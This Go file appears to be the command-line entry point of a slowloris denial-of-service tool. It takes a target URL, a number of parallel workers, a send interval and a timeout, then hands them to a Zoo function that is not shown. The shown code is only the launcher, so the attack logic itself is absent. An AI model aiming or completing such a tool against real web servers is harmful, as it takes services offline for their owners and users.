package main

import (
	"flag"
	"fmt"
	"net/url"
	"time"
)

func main() {
	// cmd flags
	var rawURL *string = flag.String("url", "", "URL to perform attack")
	var count *int64 = flag.Int64("count", int64(10), "Number of parallel workers")
	var interval *time.Duration = flag.Duration("interval", 1*time.Second, "Interval for sending data")
	var timeout *time.Duration = flag.Duration("timeout", 10*time.Second, "Timeout for the whole operation")

	flag.Parse()
	if !flag.Parsed() {
		return
	}

	if *rawURL == "" {
		flag.PrintDefaults()
		return
	}

	parsed, err := url.Parse(*rawURL)
	if err != nil {
		fmt.Println(err)
		return
	}

	fmt.Println("slowloris...")
	fmt.Printf("creating zoo of %d loris for %s\n", *count, rawURL)
	if err := Zoo(Config{
		URL:      parsed,
		Count:    *count,
		Interval: *interval,
		Timeout:  *timeout,
	}); err != nil {
		fmt.Println(err)
	}

	return
}
